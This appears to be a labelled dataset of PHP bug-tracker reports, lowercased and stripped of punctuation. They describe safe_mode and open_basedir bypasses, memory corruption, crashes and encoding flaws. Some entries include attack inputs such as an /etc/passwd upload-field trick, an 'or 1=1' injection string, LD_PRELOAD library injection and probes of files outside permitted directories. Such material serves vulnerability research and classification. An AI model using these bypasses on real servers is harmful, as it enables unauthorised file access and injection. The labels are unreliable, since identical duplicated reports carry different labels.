php3 safe_mode and popen php3 is a scripting language used in many webhosting setups often in hosting setups so called safe_mode is enabled which restricts the user in many ways for example in safe_mode you are supposed to be able to execute only programs from a safe_mode_exec_dir if one is defined within that directory there should be only a restricted command set that is considered safe when safe_mode is enabled php3 is supposed to apply escapeshellcmd to each shell command to prevent the user from breaking out of this directory as it turns out the popen function does not do this in safe_mode i was able to set up a web server with safe_mode enabled and a safe_mode_exec_dir containing only ls	9
php 5.1.4 and 4.4.2 error_log safe mode bypass error_log function send to email file or display your error message you can send error messages per mail or write into files issue is very simple error_log check safe_mode and open_basedir in stream function but is n't allowed use url and problem exists in incorrect filename	2
heads up installed the latest win32 binaries of thread-safe php 5.2.1 on win32 apache and iis php started crashing definitely php php5ts.dll when i went to access the myprobb web forum win32 apache flat out crashes iis bails with http 500 errors worked fine under 5.2.0 i only depend on php for the forum a straight-up phpinfo page seems to work fine i upgraded by killing each webserver instance copying the files from the zip file over the existing php directories and files and restarting the server so i then took the hard route of deleting the php directory and dumping the binaries into it from scratch and putting together a working php.ini file again crash	11
dev-lang/php 5.2.6-r6 arbitrary code execution dos safe_mode bypass cve-2008 3658,3659,3660	11
php 5.2.10/5.3.0 zend_ini.c memory disclosure php is an html-embedded scripting language much of its syntax is borrowed from c java and perl with a couple of unique php-specific features thrown in the goal of the language is to allow web developers to write dynamically generated pages quickly	11
php ini_restore memory information disclosure vulnerability	11
php 5.2.12/5.3.1 session.save_path safe_mode and open_basedir bypass a visitor accessing your web site is assigned a unique id the so-called session id this is either stored in a cookie on the user side or is propagated in the url session.save_path defines the argument which is passed to the save handler if you choose the default files handler this is the path where the files are created defaults to tmp see also session_save_path	9
php splobjectstorage class unserialize code execution php could allow a remote attacker to execute arbitrary code on the system caused by an error in the splobjectstorage class unserialize function an attacker could exploit this vulnerability to execute arbitrary code	11
php 5.3.5 grapheme_extract null pointer dereference internationalization extension further is referred as intl is a wrapper for icu library enabling php programmers to perform uca-conformant collation and date/time/number/currency formatting in their scripts grapheme_extract function to extract a sequence of default grapheme clusters from a text buffer which must be encoded in utf-8	11
format-string vulnerability in php phar extension i just found several format-string vulnerability in php phar extension a bug has been filed in the php bugtracker private on error several class methods passes the supplied argument to zend_throw_exception_ex which prints a formatted error message using such value as the formatter string php fatal error uncaught exception pharexception with message unable to open phar for reading	11
php 5.4.0rc6 x64 denial of service php 5.3.9 requires you to know the address of a writable address filled with null 32bit requires you to create a fake 32bit hashtable instead of a 64bit one because this vulnerability also allows leaking memory addresses aslr can be semi defeated this means around 4000 tries 4000 requests 4000 crashes are enough to bruteforce code addresses to execute arbitrary code despite aslr/nx better exploit might be possible after deeper research heap massage this specific attack only works if there is no suhosin-patch rhel centos	11
critical php remote vulnerability introduced in fix for php hashtable collision dos the vulnerability happens when the number of variables exceeds max_input_vars and the variable is an array variable if p ‘ ‘ instead of an else case which would stop and return the code is allowed to continue executing the code continues to execute up to line 207 the second highlighted line at line 207 it is calling a macro z_arrval_pp to get a reference to the updated hashtable this is where the code execution can occur when the code reaches the point where the number of variables is greater than max input gpc_element_p will point to the previous variable value z_arrval_pp will expect the value to be a zval struct with a hashtable usually initialized by array_init … but that memory hasn ’ t been initialized in the case were the previous value was a non-array plain variable	11
php integer signedness issues in php_stream_scandir an integer signedness issue leading to a heap-based buffer overflow was found in the way php implemented its scandir function if scandir was used to list files and directories from a directory containing a large number of files it could cause php to crash to under some conditions execute arbitrary code with the permissions of the user running php	11
php openssl_x509_parse memory corruption vulnerability quote from php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html the php function openssl_x509_parse uses a helper function called asn1_time_to_time_t to convert timestamps from asn1string format into integer time stamp values the parser within this helper function is not binary safe and can therefore be tricked to write up to five nul bytes outside of an allocated buffer this problem can be triggered by x509 certificates that contain nul bytes in their notbefore and notafter timestamp fields and leads to a memory corruption that might result in arbitrary code execution depending on how openssl_x509_parse is used within a php application the attack requires either a malicious cert signed by a compromised/malicious ca or can be carried out with a self-signed cert	11
php memory corruption in openssl_x509_parse stefan esser reported a vulnerability in the php openssl extension a memory corruption flaw was found in the way the openssl_x509_parse function of the php openssl extension parsed x.509 certificates a remote attacker could use this flaw to provide a malicious self-signed certificate or a certificate signed by a trusted authority to a php application using the aforementioned function causing the application to crash or possibly allow the attacker to execute arbitrary code with the privileges of the user running the php interpreter	11
php openssl_x509_parse memory corruption vulnerability quote from php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html the php function openssl_x509_parse uses a helper function called asn1_time_to_time_t to convert timestamps from asn1string format into integer time stamp values the parser within this helper function is not binary safe and can therefore be tricked to write up to five nul bytes outside of an allocated buffer this problem can be triggered by x509 certificates that contain nul bytes in their notbefore and notafter timestamp fields and leads to a memory corruption that might result in arbitrary code execution depending on how openssl_x509_parse is used within a php application the attack requires either a malicious cert signed by a compromised/malicious ca or can be carried out with a self-signed cert	11
the file upload feature opens a possible security hole public internet users can potentially read files residing on the webserver through existing php code using the file upload feature if there is a form with a file input field called uploadedfile for example followed by another form field with the same name uploadedfile which has the value of the path of a file on the webserver etc/passwd works fine in many cases then the code handling the uploaded file will process the file pointed by the path given by the second form element not the file actually uploaded if the code is meant to display the uploaded file or save it under a public url then the public users can see its contents there is a permission issue as far as the ownership of the webserver process but most setups use nobody or another use/group which can read certain files on the webserver i have not tested to see if the file gets deleted at the termination of the script as the temporary files do	9
move_uploaded_file breaks safe_mode and open_basedir restrictions one of my customers has found a way to break my safe_mode and open_basedir restrictions www.net-force.nl as you can see i have both set safe_mode and the open_basedir restriction but this user is able to upload any file where the apache user has write access credits fly out to bastijs net-force.nl for finding this bug	2
crash inside libpq pqexec with php 4.1.2 actually culprit is wordwrap this is difficult impossible to reproduce with a short script please download and unpack you need to have postgresql and create a specific database with specific data in it here s the readme file from the tarball summary php segfaults for php versions 4.1.2 the source files in this archive are proprietary commercial software please use them only to debug php problems system red hat linux 8.0 postgresql 7.2.2 as supplied with red hat linux 8.0 apache 1.3.27 configured as follows configure with-layout=apache enable-shared=max enable-rule=shared_core php tried 4.2.2 4.2.3 and 4.3.0rc2 all configured as follows configure with-pgsql=shared with-gnu-ld with-apxs=/usr/local/apache/bin/apxs how to reproduce 1 install apache 1.3.27 and php 4.2.2 4.2.3 or 4.3.0rc2 from source configure postgresql 7.2.2 to trust local connections that is in var/lib/pgsql/data/pg_hba.conf make the local line read thus local all trust 2 create and populate the database createdb u postgres spam psql u postgres d spam spam-database-dump 3 copy the php files to your document root somewhere convenient 4 browse 5 log in as admin password foo 6 click on pending messages apache will segfault however using php 4.1.2 configured as above it works fine extensive investigation shows that it s segfaulting inside libpq inside pqexec but the function which segfaults is malloc which leads me to believe there s memory corruption going on	11
imap routines hang when to header is too large the starting point for this was that our webmail customised imp would crash if the to header was too large probably the header violates rfc822 but php should be able to cope or at least fail gracefully and not hang we are running php built with the imap4.5 uwash c-client with ldap with mysql apache is built with mods rewrite mime_magic the lastest fastcgi the latest modssl the fastcgi connection is used for most pages rendered from our site playing around with truss led us to suspect mime_header_decode was at fault truss line is useful because i would n't rely on the gdb backtrace	9
imap_header fails with many to addresses imap-2002.rc5 also does not work with imap-2002.rc2 apache 2.0.40 openldap 2.1.4 mysql 3.23.49 configure with-apxs2=/local/apache/bin/apxs enable-force-cgi-redirect disable-cli with-imap=/home/xxx/imap-2002.rc5 with-ldap with-mysql=/local/mysql the call to imap_header fails on messages with many to addresses one message i received has 128 addresses in the to field of the form firstname lastname firstname.lastname example.com other messages with fewer addresses do not cause a problem there is a bug in the database that was supposed to have been fixed in cvs in june either that change has not made it into the current cvs or this is a different bug i d be happy to mail someone a typical message that produces the problem however you should easily be able to craft such a message yourself in a text file by simply repeating the address in the to field	9
imap_header crashes with bad to or from header this is a very similar issue to bug 19280 but that bug was closed and this issue still exists also occurs with php-4.3.0 apache-2.0.43 header causes a segfault even from cli php in ext/imap/php_imap.c if i change the define define php_imap_address_size_buf 10 to something larger say 100 the segfault disappears since php_imap_address_size_buf was added to solve bug 19280 i thought this may be a related issue but adding the same number of alphanumeric characters back into the email address itself breaks it again an older server running php 4.1.2 imap-2001a apache 1.3.27 horde/imp was not affected by the same messages	9
imap_fetch_overview crashes with a very big address in from i reproduced this bug with php 4.3.2 and 4.2.3 so this is not a new problem if you imap_fetch_overview a mailbox with a message with an huge address in the to field php crashes	9
exif_read_data incorrectly calculates nesting_level throwing warnings exif_read_data is still throwing the same warnings as in 31797 on every camera-created image i give it for cameras both new and old cheap and expensive the debian package in question is actually based off the 2005-02-06 4cvs snapshot which is later than the time at which 31797 was reported to be fixed in 4cvs adam conrad the package maintainer confirms the bug is in php and can reproduce the problem with his own camera-created images quoting an email from adam conrad danny park said anyway when you say the nesting limit was increased from 5 to 25 are you saying 4.3.10-3 reflects that increase indeed it does however it seems that the way the code s written the nesting_level increases quite rapidly and obviously takes on a different meaning than the original developer thought it had as an example your 5 images all work fine with jhead 1 which has a hardcoded directory nesting limit of 5 however with some debug statements thrown into php s exif.c we re reaching nesting levels of img_0949.jpg 53 p1000415.jpg 54 img_0669.jpg 65 dsc00804.jpg 48 dcp00884.jpg 38 i do n't currently have the time to hunt down what upstream s doing wrong here so i would encourage you to re file this bug upstream and you re welcome to quote this whole message i recommend they have a look at what jhead 1 is considering directory nesting and mimic it since php s obviously doing something a bit differently if it does n't get fixed properly upstream in a relatively timely fashion i ll make sure the next debian packages uploaded either revert this change or hack max_ifd_nesting_level to be something ridiculously high like 250 i ll test with some pro cameras lying around the house here to see just how much higher we can get before i do that a second email from adam conrad woo an image from my eos 300d gets the counter up to 75 i m just going to set it at 250 in the next upload you should still talk to upsteam about unbreaking this as it looks like they re incrementing the counter at altogether the wrong bounday	11
exif_read_data reads very little data from what it used to read i have a script that parses exif data from images displaying them as a new image using gd that contains the data lately i am not sure when exactly but i suspect it was after upgrading to stable-cvs due to fixing of the unserialize bug i suffered badly from it seems that most of the important exif data is simply not read like exposuretime etc i asked someone to verify that the image indeed has the details and it looks that it does here s a screenshot from his exif	11
infinite recursion due to corrupt jpeg an image seen in the wild and probably generated non-maliciously reliably causes exif_read_data to go into infinite recursion i ve fixed the problem and created a patch against php 4.4.0 tstarling/php/exif_ifd2.patch the test image is here tstarling/php/carcraftbuckett.jpg the problem was an assumption that images would follow the spec and include a maximum of 2 ifd headers ifd0 for the image and ifd1 for the thumbnail the test image probably has the next ifd offset field pointing back to the same structure creating an infinite loop i have n't studied the test image in detail but my patch allows php s exif functions to read it without segfaulting which is good enough for me i decided to ignore any further ifds beyond the first two rather than issue an error for compatibility with possible future revisions of the exif spec	9
patch header can be injected when using mb_send_mail the unexpected header can be injected at the mb_send_mail function the mail function is doing the check of the unexpected control code to to and subject however the mb_send_mail function is n't doing a check by the feature of the function overload mail function is exchanged for the mb_send_mail function therefore it thinks that the check like the mail function is necessary about the mb_send_mail function too it is to that seems to need a check the report is php4 but needs the same correction about php5	9
imap_body able to bypass php_openbasedir vulnerability in c-client library tested with versions 2000,2001,2004 mail_open could be used to open stream to local files for php and imap module imap_open allow to bypass safemode and open_basedir restrictions use imap_body or others to view a file and imap_list to recursively list a directory s/mailbox/file imap_createmailbox imap_deletemailbox imap_renamemailbox to create delete rename files with apache privileges that the file could not be accessed due to a security permission the ability to see any file on the server	2
reading past array in sscanf leads to arbitary code execution ext/standard/scanf.c line 887 objindex points past the end of array in other format cases too full description will try to dereference a pointer to pointer which usually causes segmentation fault	11
segmentation fault in imagecreatefromgif imagecreatefromgif segfaults when broken gif images are loaded reproduce code php im=imagecreatefromgif expected result should not segfault actual result the bug comes from the file php-5.1.4/ext/gd/libgd/gd_gif_in.c:394 here is the full trace gdb bt 0 lwzreadbyte fd flag=variable flag is not available at home/sysop/php-5.1.4/ext/gd/libgd/gd_gif_in.c:394 1 in readimage im fd len=130 height=130 cmap interlace=0 at home/sysop/php-5.1.4/ext/gd/libgd/gd_gif_in.c:520 2 in php_gd_gdimagecreatefromgifctx fd at home/sysop/php-5.1.4/ext/gd/libgd/gd_gif_in.c:199 3 in php_image_create_from ht=variable ht is not available at home/sysop/php-5.1.4/ext/gd/gd.c:1608 4 in zif_imagecreatefromgif ht=292440 return_value return_value_ptr this_ptr return_value_used=1 at home/sysop/php-5.1.4/ext/gd/gd.c:1674 5 in zend_do_fcall_common_helper_spec execute_data at home/sysop/php-5.1.4/zend/zend_vm_execute.h:200 6 in execute op_array at home/sysop/php-5.1.4/zend/zend_vm_execute.h:92 7 in zend_execute_scripts type=8 retval file_count=3 at home/sysop/php-5.1.4/zend/zend.c:1109 8 in php_execute_script primary_file at home/sysop/php-5.1.4/main/main.c:1732 9 in main argc=2 argv at home/sysop/php-5.1.4/sapi/cli/php_cli.c:1092	9
imap_body able to bypass php_openbasedir vulnerability in c-client library tested with versions 2000,2001,2004 mail_open could be used to open stream to local files for php and imap module imap_open allow to bypass safemode and open_basedir restrictions use imap_body or others to view a file and imap_list to recursively list a directory s/mailbox/file imap_createmailbox imap_deletemailbox imap_renamemailbox to create delete rename files with apache privileges that the file could not be accessed due to a security permission the ability to see any file on the server	2
better fix for cve-2007-1887-1888/mopb-41 from what i understand your fix for the above mentioned vulnerabilities was to patch the bundled sqlite libraries to handle certain parameters that might be null pointers however for distributions where php is built against external sqlite packages this has no effect and the resulting packages are still vulnerable unless the sqlite packages are independantly patched in the debian php packages we ve patched the php_sqlite module to check for the null pointers outside of the call to the sqlite functions thus not requiring a patch or change in the behaviour of the sqlite libraries anyway if you want to continue keeping a patched bundled version of sqlite that s fine but i thought i d share this	9
mcrypt_create_iv not using random seed this bug is only for mcrypt_create_iv when passing mcrypt_rand as the source i believe this is a bug that has been re-introduced to php at some point after 5.1.4 this bug is not in 5.1.4 but is currently in php 5.2.1 and it was reported previously in 5.0.x so it seems fixed then unfixed mcrypt_create_iv is making a call to php_rand_r but is passing an uninitialized unsigned int as the random seed i believe it should be calling php_rand with no argument which would invoke the auto-seeding feature of the php function rand or simply rand in 5.1.4 it was rand here is a patch that should fix it additionally the expected output below is from a version after applying the patch above sorry for the wall-o-text just wanted to make sure this was considered legit reproduce code srand double microtime true 1000000 module mcrypt_module_open mcrypt_rijndael_128 null mcrypt_mode_cfb null echo iv1 bin2hex mcrypt_create_iv mcrypt_enc_get_iv_size module mcrypt_rand n echo iv2 bin2hex mcrypt_create_iv mcrypt_enc_get_iv_size module mcrypt_rand n echo iv3 bin2hex mcrypt_create_iv mcrypt_enc_get_iv_size module mcrypt_rand n expected result 3 random hex strings e.g iv1 3e280c689f08c1a6e7993e41040eec1b iv2 caa3b8ae0241995d36a346904b7672bf iv3 a4d25fe39436d72b96cf68efe7ceb1a5 actual result iv1 a67ed3dd28eb59be57bbfee36f75df52 iv2 a67ed3dd28eb59be57bbfee36f75df52 iv3 a67ed3dd28eb59be57bbfee36f75df52	4
open_basedir bypass via readfile file_exists etc does not allow checking the existence of files outside the directories specified in open_basedir appearently readfile does not have this restriction and thus allows checking the existence of files anywhere in the filesystem if realpath filename returns a string i.e not false the file exists this is a circumvention of the open_basedir restriction in file_exists etc reproduce code the following should always be true but it is n't when dir is outside the directories specified in open_basedir var_dump file_exists dir bool realpath dir	2
php_openssl_make_req buffer overflow function php_openssl_make_req in ext/openssl/openssl.c has buffer overflow when parsing openssl.conf look at this char buffer 200 v sk_conf_value_value dn_sk i type v name len strlen type if len sizeof default continue len sizeof default 1 if strcmp default type len 0 continue memcpy buffer type len buffer len 0 no check if name field with default removed is larger than 200 if u change 0.organizationname_default in openssl.conf to 0 300 chars default then the buffer will be overflown in the memcpy reproduce code u can test this with openssl_csr_new expected result program should keep running actual result program crashed	11
url rewrite mechanism data sent to foreign sites when i use output_add_rewrite_var key value it also adds a hidden field containing key and value to forms which have an absolute url as action-attribute of the form-tag the transparent session-id support using the directive session.use_trans_sid is also affected i also reported this problem as 42804 in the session-section and was a bit shocked about the answer that i simply should n't use the feature and the classification bogus this section is maybe better anyway the configure-line of my provider configure program-suffix=5 with-pear=/usr/local/lib/php5 with-config-file-path=/usr/local/lib/php5 with-libxml-dir=/usr/local/php5 with-mysqli=/usr/local/mysql/bin/mysql_config enable-soap with-xsl=/usr/local/php5 enable-mbstring=all with-curl=/usr/local/php5 with-mcrypt=/usr/local/php5 with-gd with-pdo-mysql=/usr/local/mysql with-freetype-dir with-libxml-dir=/usr/local/php5 with-mysql=/usr/local/mysql with-zlib enable-debug=no enable-safe-mode=no enable-discard-path=no with-png-dir=/usr/lib enable-track-vars with-db with-gdbm enable-force-cgi-redirect with-ttf=/usr enable-ftp enable-dbase enable-memory-limit enable-calendar enable-wddx with-jpeg-dir=/usr/src/kundenserver/jpeg-6b enable-bcmath enable-gd-imgstrttf enable-shmop enable-mhash with-mhash=/usr/src/kundenserver/mhash-0.8.9 with-openssl enable-xslt with-xslt-sablot with-dom with-dom-xslt with-dom-exslt with-imap with-iconv=/usr/local with-bz2 with-gettext enable-exif with-idn with-sqlite enable-sqlite-utf8 reproduce code output_add_rewrite_var sessionid 12345 type in your city to get to know how you can find us form action input type text name city input type submit form php expected result i expect to get the form unchanged as output because the manual says please note that absolute urls are n't rewritten actual result the output is type in your city to get to know how you can find us form action input type hidden name sessionid value 12345 input type text name city input type submit form	11
values set with php_admin in httpd.conf can be overwritten with ini_set when i set a value inside the httpd.conf with php_admin_value or php_admin_flag that is ini_all or ini_perdir it can be overwritten at runtime using ini_set i do n't think this should be possible but the documentation on this problem does n't assure me if this is a bug or a feature reproduce code etc/apache2/httpd.conf php_admin_value memory_limit 3145728 iniset_test.php php old ini_set memory_limit 20971520 echo old old new ini_get memory_limit echo br new new expected result the result is the following old 3145728 new 3145728 actual result the result is the following old 3145728 new 20971520	2
open_basedir bypass via glob file_exists etc does not allow checking the existence of files outside the directories specified in open_basedir this can be circumvented using glob glob does check open_basedir but its return type still reveals whether files exist outside open_basedir the existence of a file can be checked using is_array glob filename reproduce code var_dump glob etc/hosts var_dump glob etc/does-not-exist expected result bool false bool false or array 0 array 0 actual result bool false array 0	2
patch imap toolkit crash rfc822.c legacy routine buffer overflow i am using the uw imap c-client-library with php-5.2.4 and apache 2.0.61 for my webmailer software twig some actions causes the httpd child to crash httpd imap toolkit crash rfc822.c legacy routine buffer overflow see also uw imap developers say that it is definitely a php issue which you have been denying in former bug reports so please have a second thought on this issue here is the response of the uw imap developers php is calling c-client legacy rfc 822 header generation routines that write headers into a big enough buffer these routines were never intended for external use there is no way in the old interface to know how much space is left in the buffer those routines were written in 1988 when that was good enough they were left unfixed because supposedly nobody used them when it became clear that people were using those routines after all they were replaced by routines with proper buffer checking the old routine names exist as compatibility interfaces into the new routines but the old interface itself prevents proper checking let s be clear if php calls these old routines it is not just a core dump issue it is a security bug the abort catches some but not all of the buffer overflows in case it was n't clear from the previous message there is nothing to fix at the c-client end that legacy routine buffer overflow is effectively the same thing as getting a segv from strcpy as the message says it s a detected buffer overflow but there is nothing that c-client can do to recover the fix is not to call the routine that has the buffer overflow but that has to be in php i m sorry that this is bad news for you especially as the php developers seem to be unable to understand the issue and thus are telling you to talk to me actual result httpd child crashes with a buffer overflow httpd imap toolkit crash rfc822.c legacy routine buffer overflow	11
mb_check_encoding crashes mb_check_encoding segmentation fault reproduce code text asdf asdf asdf asdf asdf asdf asdf if mb_check_encoding text html-entities text htmlentities text echo text expected result string actual result nothing segmentation fault	11
magic_quotes_gpc does n't work magic_quotes_gpc does n't escape get post cookie and request variables it worked with the same configuration under 5.2.6 i have magic_quotes_gpc set in php.ini reproduce code url q php var_dump php_version var_dump get_magic_quotes_gpc var_dump get q expected result string 5 5.2.7 int 1 string 2 actual result string 5 5.2.7 int 1 string 2	9
filter_unsafe_raw not applied when configured as default filter even with flags the unsafe_raw filter is not applied when configured as default filter i found that the php_sapi_filter internal function in ext/filter/filter.c intentionally bypass this filter if if_g default_filter filter_unsafe_raw apply default filter else the unsafe_raw filter does nothing by default but it can optionally strip or encode special characters and it is the only filter which is able to do that without doing any other filtering reproduce code prints filter.default and filter.default_flags values check if get a contains a null byte null bytes may be filtered by filter_unsafe_raw with the filter_flag_strip_low flag check if get a though filter_input with the same filter/flags contains a null byte php echo filter.default ini_get filter.default br n echo filter.default_flags ini_get filter.default_flags br n echo br echo get a contains 0 strpos get a 0 false yes no br n echo br echo get a throught filter_var contains 0 strpos filter_var get a filter_unsafe_raw filter_flag_strip_low 0 false yes no br echo br expected result filter.default unsafe_raw filter.default_flags 4 get a contains 0 no get a through filter_var contains 0 no actual result filter.default unsafe_raw filter.default_flags 4 get a contains 0 yes get a through filter_var contains 0 no	9
mbstring.func_overload set in htaccess becomes global configure with-apxs=/usr/local/apache/bin/apxs prefix=/usr/local/php enable-mbstring with-mbregex apache version 1.3.29 we set in htaccess php_value mbstring.internal_encoding utf-8 php_value default_charset utf-8 php_value mbstring.http_output utf-8 php_value mbstring.encoding_translation on php_value mbstring.detect_order utf-8 php_value mbstring.func_overload 7 for specific site but string functions on other web sites at the same apache doest work other sites use cp1251 enconding the string functions stop to work when anyone access the unicode site when we stop apache and start it again cp1251 string functions work properly we tryed the same configuration in the virtualhost directive at apache s httpd.conf for the unicode site and in the directory but it is the same result with or without setlocale lc_all bg_bg.cp1251 or bg_bg or bg_bg.utf-8 we have tryed all combinations and it still doesnt work thanks in advance reproduce code php v test.php print substr v,0 strpos v expected result actual result	11
exif_read_data segfaults on certain corrupted jpeg files there seems to be a problem in exif_read_data where some fields representing offsets are taken directly from the file without being validated resulting in a segmentation fault i originally found this issue by fooling around with the zzuf fuzzer and reported a very similar bug in the jhead exif utility at original image can be found at corrupted image can be found at reproduce code php var_dump exif_read_data server argv 1 array file computed any_tag expected result dump of exif data if possible or false since the jpeg file is indeed corrupt actual result segmentation fault quick gdb dump gdb run starting program home/frode/temp/z/z3/php5.2-200905241830/sapi/cli/php home/frode/temp/z/s.php home/frode/temp/z/a-s6.jpeg program received signal sigsegv segmentation fault in exif_process_ifd_in_jpeg imageinfo dir_start address out of bounds offset_base ii ifdlength=15055 displacement=30 section_index=3 at home/frode/temp/z/z3/php5.2-200905241830/ext/exif/exif.c:1088 1088 return uchar value 1 8 uchar value 0 gdb up 1 in exif_read_file imageinfo filename value optimized out read_thumbnail value optimized out read_all=0 at home/frode/temp/z/z3/php5.2-200905241830/ext/exif/exif.c:3221 3221 exif_process_ifd_in_jpeg imageinfo charbuf+offset_of_ifd charbuf length 14 displacement section_ifd0 tsrmls_cc note the dir_start address being out of bounds which causes the uchar value 1 to segfault the function names are a bit confusing maybe it s because of method inlining	9
popen with modes such as e or er cause php.exe to crash trying different modes on php.exe on windows i tried e and er both cause php to crash a mode of re works this is also different from linux where it seems that only r or w are valid modes anything else or more than 1 character result in a php warning of invalid argument reproduce code php t1 popen echo hello e pclose t1 t2 popen echo hello re pclose t2 t3 popen echo hello er pclose t3 expected result expected output would be the same as linux warning popen echo hello e invalid argument in data/workspace/phpcode/popen/badpopen.php on line 2 warning popen echo hello re invalid argument in data/workspace/phpcode/popen/badpopen.php on line 4 warning popen echo hello er invalid argument in data/workspace/phpcode/popen/badpopen.php on line 6 actual result windows crashes on e and er but allows re	9
safe_mode_include_dir fails using the following config options ignores the safe_mode_include_dir and does a uid-check even though the php-file is in the safe_mode_include_dir this is likely still present in 5.3.1rc2 safe_mode on safe_mode_include_dir usr/share/php include_path usr/share/php the following code php require_once pear/exception.php echo ok to me it appears that php 5.3.x now use a different code-path to open files as the following patch against the function php_plain_files_stream_opener 5.3.0 solves the issue for us as it appears there is no safe_mode_include_dir-check although there is a safe_mode uid-check main/streams/plain_wrapper.c 2009-11-03 15:52:59.414872711 0100 main/streams/plain_wrapper.c 2009-11-03 15:52:59.420045302 0100 988,6 988,10 return null if php_check_safe_mode_include_dir path tsrmls_cc 0 return php_stream_fopen_rel path mode opened_path options if options enforce_safe_mode pg safe_mode php_checkuid path mode checkuid_check_mode_param return null reproduce code php require_once pear/exception.php echo ok expected result ok actual result warning require function.require safe mode restriction in effect the script whose uid is 771909 is not allowed to access usr/share/php/pear/exception.php owned by uid 0 in xxxxxxxxxxxxx/peartest.php on line 2 warning require usr/share/php/pear/exception.php function.require failed to open stream no such file or directory in xxxxxxxxxxxxx/peartest.php on line 2 fatal error require function.require failed opening required pear/exception.php include_path usr/share/php in xxxxxxxxxxxxx/peartest.php on line 2	2
proc_open can bypass safe_mode_protected_env_vars restrictions environment variables specified for proc_open passed without check so safe_mode_allowed_env_vars and safe_mode_protected_env_vars settings are ignored so it become possible to use buffer overflow exploit with ld_preload=evil_library.so to bypass safe_mode restrictions and get access to any files acessible for apache uid in php.ini safe_mode on safe_mode_gid on safe_mode_include_dir safe_mode_exec_dir usr/bin/safe safe_mode_allowed_env_vars php safe_mode_protected_env_vars ld_library_path reproduce code putenv blahblah=123 putenv ld_library_path=/no/way putenv php_testvar=allowed env array blahblah 123 ld_library_path no/way php_testvar allowed dptspec array 0 array pipe r 1 array pipe w fp proc_open env dptspec pipes env echo pre while feof pipes 1 echo fgets pipes 1 1024 fclose pipes 1 echo pre expected result warning putenv function.putenv safe mode warning can not set environment variable blahblah it s not in the allowed list in my/path/test.php on line 2 warning putenv function.putenv safe mode warning can not override protected environment variable ld_library_path in my/path/test.php on line 3 php_testvar=allowed pwd=/my/path actual result warning putenv function.putenv safe mode warning can not set environment variable blahblah it s not in the allowed list in my/path/test.php on line 2 warning putenv function.putenv safe mode warning can not override protected environment variable ld_library_path in my/path/test.php on line 3 ld_library_path=/no/way php_testvar=allowed blahblah=123 pwd=/my/path	2
htmlspecialchars should check byte sequence more strictly suppose htmlspecialchars should check byte sequence more strictly for security reasons an xss exploit code has been unveiled ja i wrote a primitive patch i do n't know whether it is useful though reproduce code overlong utf-8 sequence echo htmlspecialchars a\xc0\xaf ent_quotes utf-8 invalid shift_jis sequence echo htmlspecialchars b\x80 ent_quotes shift_jis echo htmlspecialchars c\x81\x7f ent_quotes shift_jis invalid euc-jp sequence echo htmlspecialchars d\x80 ent_quotes euc-jp echo htmlspecialchars e\xa1\xff ent_quotes euc-jp echo htmlspecialchars f\x8e\xff ent_quotes euc-jp echo htmlspecialchars g\x8f\xa1\xff ent_quotes euc-jp expected result output nothing actual result a amp b amp c amp d amp e amp f amp g amp means an invalid byte	9
utf8_decode xml_utf8_decode vuln taken from description xml_utf8_decode function incorrectly decode reproduce code php ill=chr chr chr chr ill=addslashes ill echo utf8_decode ill echo htmlspecialchars ill ent_quotes utf-8 expected result it will output a incorrectly actual result it will output a incorrectly this is actually a php security vulnerability timeline reported by root 80sec.com may 11 discovered by webmaster lapstore.de june 19 discovered by giorgio maone eduardo vela july 14 reported and fixed on phpids july 14 microsoft notified of a xss filter bypass july 14 fixed xss filter bypass on noscript 1.9.6 july 20 vulnerability disclosed on blackhat usa 2009 july 29 added signature to acunetix wvs august 14 references 83935 read the references for further details reproduce code php echo utf8_decode addslashes xf0\xc0\xc0\xa7 or 1=1 more code in references check the slides and the acunetix blog expected result or 1=1 actual result or 1=1	11
null pointer deref when methodname is not set this is cve-2010-0397 originally reported by auke van slooten at when processing an invalid one without a methodname required by the specs xml-rpc request the extension does n't check for the null value returned by the xmlrpc library this null is then passed to estrdup which dereferences the pointer leading to a segmentation fault this can easily be used to perform dos attacks by crashing the server i ve already notified security php.net but since the issue is public there s no point in hiding it or the patch the attached patch fixes the problem which can also be found at test script php method req xml version 1.0 methodcall methodcall var_dump xmlrpc_decode_request req method var_dump method echo done\n expected result null null done actual result segmentation fault	11
segfault in filter_var with filter_validate_email with large amount of data using the attached test-script with just a large amount of data e.g 8kb of just x segfaults php tried with 5.3.3 fedora and also some 5.3.4-snapshot that i could get hold of crashed for me with around 8kb of data if it works fine for you maybe increase that limit to 16kb or so test script php email file_get_contents x.data r filter_var email filter_validate_email var_dump r and just dump a large number of characters like x in x.data for a in seq 1 8000 do echo n x x.data done expected result bool false actual result segfault	11
utf8_decode xml_utf8_decode vuln taken from description xml_utf8_decode function incorrectly decode reproduce code php ill=chr chr chr chr ill=addslashes ill echo utf8_decode ill echo htmlspecialchars ill ent_quotes utf-8 expected result it will output a incorrectly actual result it will output a incorrectly this is actually a php security vulnerability timeline reported by root 80sec.com may 11 discovered by webmaster lapstore.de june 19 discovered by giorgio maone eduardo vela july 14 reported and fixed on phpids july 14 microsoft notified of a xss filter bypass july 14 fixed xss filter bypass on noscript 1.9.6 july 20 vulnerability disclosed on blackhat usa 2009 july 29 added signature to acunetix wvs august 14 references 83935 read the references for further details reproduce code php echo utf8_decode addslashes xf0\xc0\xc0\xa7 or 1=1 more code in references check the slides and the acunetix blog expected result or 1=1 actual result or 1=1	9
xml_utf8_decode incorrectly decode xml_utf8_decode function incorrectly decode reproduce code php ill=chr chr chr chr ill=addslashes ill echo utf8_decode ill echo htmlspecialchars ill ent_quotes utf-8 expected result it will output a incorrectly actual result it will output a incorrectly	9
mb_strcut returns garbage with the excessive length parameter mb_strcut returns garbage when the following conditions are met 1 the value specified to length parameter exceeds the length of the subject string 2 mbstring.internal_encoding is set to some single-byte encoding the garbage may consist of uncleared part of the heap that has previously been used for some purpose which could lead to unexpected information exposure this bug was originally reported by mateusz kocielski test script php b bbbbbbbbbbb str_repeat this is a secret message is n't it 1 var3 mb_strcut b 0 1000 echo var3 expected result bbbbbbbbbbb actual result bbbbbbbbbbb d 袌=m m m m 5 m m this is a secret message is n't it g 1 m m m p m var3	7
